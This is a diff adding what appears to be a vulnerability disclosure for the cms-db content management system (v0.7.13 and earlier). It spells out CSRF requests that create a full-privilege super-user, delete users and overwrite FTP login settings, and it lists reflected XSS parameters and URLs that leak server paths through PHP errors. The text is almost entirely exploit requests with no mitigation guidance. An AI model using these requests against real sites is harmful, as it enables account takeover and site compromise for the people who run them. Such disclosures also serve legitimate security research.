@@ -1,0 +1,79 @@
+# Author: cp77fk4r | Empty0pagE[SHIFT+2]Gmail.com
+# Software Link: [http://cms-db.de/download]
+# Version: [cms -db <= v0.7.13]
+#
+#
+# [CSRF]
+-Add super-user: <POST>
+URL:
+/cms/admin/newuser.php
+#
+PARAMS: <POST>
+user=[USER_NAME]&pass=[PASSWORD]&repeat=[PASSWORD]&pages=on&files=on&includes=on&template=on&gbook=on&blog=on&stats=on&button=Save
+#
+-Delete user: <GET&POST>
+USR:
+http://[SITE_URL]/admin/deluser.php
+#
+PARAMS: <GET>
+user=[USER_ID].php
+#
+PARAMS: <POST>
+user=[USER_ID].php&button=Yes
+#
+-Set ftp server login: <POST>
+URL:
+/cms/admin/ftpsettings.php
+#
+PARAMS: <POST>
+ftpserver=localhost&ftpuser=[USERNAME]&ftppw=[PASSWORD]&ftpdir=%2F&button=Save
+#
+#
+# [XSS]
+http://[SITE_URL]/admin/index.php?locale=[XSS]
+http://[SITE_URL]/blogfeed.php?l=[XSS]
+http://[SITE_URL]/admin/users.php?saved=[XSS] <Login required>
+#
+#
+# [Full Path Disclosure]
+Fatal errorz:
+URL:
+http://[SITE_URL]/gb.php
+Fatal error: Call to a member function addToHead() on a non-object
+in [Full Path] on line 13
+#
+http://[SITE_URL]/contact.php
+Fatal error: Class 'LocalizingClass' not found in [Full
+Path]/contact.php on line 3
+#
+http://[SITE_URL]/blog.php
+Fatal error: Class 'LocalizingClass' not found in [Full
+Path]/blog.php on line 7
+#
+Warning:
+http://[SITE_URL]/functions_url.inc.php
+Warning: include() [function.include]: Unable to access
+../data/settings/url.inc.php in [Full Path]/functions_url.inc.php on
+line 10
+Warning: include(../data/settings/url.inc.php) [function.include]:
+failed to open stream: No such file or directory in [Full
+Path]/functions_url.inc.php on line 10
+Warning: include() [function.include]: Unable to access
+../data/settings/url.inc.php in [Full Path]/functions_url.inc.php on
+line 10
+Warning: include(../data/settings/url.inc.php) [function.include]:
+failed to open stream: No such file or directory in [Full
+Path]/functions_url.inc.php on line 10
+Warning: include() [function.include]: Failed opening
+'../data/settings/url.inc.php' for inclusion
+(include_path='.:/usr/share/php:/usr/share/pear') in [Full
+Path]/functions_url.inc.php on line 10
+Warning: file_get_contents() [function.file-get-contents]: Unable
+to access ../data/urlindex.txt in [Full Path]/functions_url.inc.php on
+line 11
+Warning: file_get_contents(../data/urlindex.txt)
+[function.file-get-contents]: failed to open stream: No such file or
+directory in [Full Path]/functions_url.inc.php on line 11
+#
+#
+# [e0f]
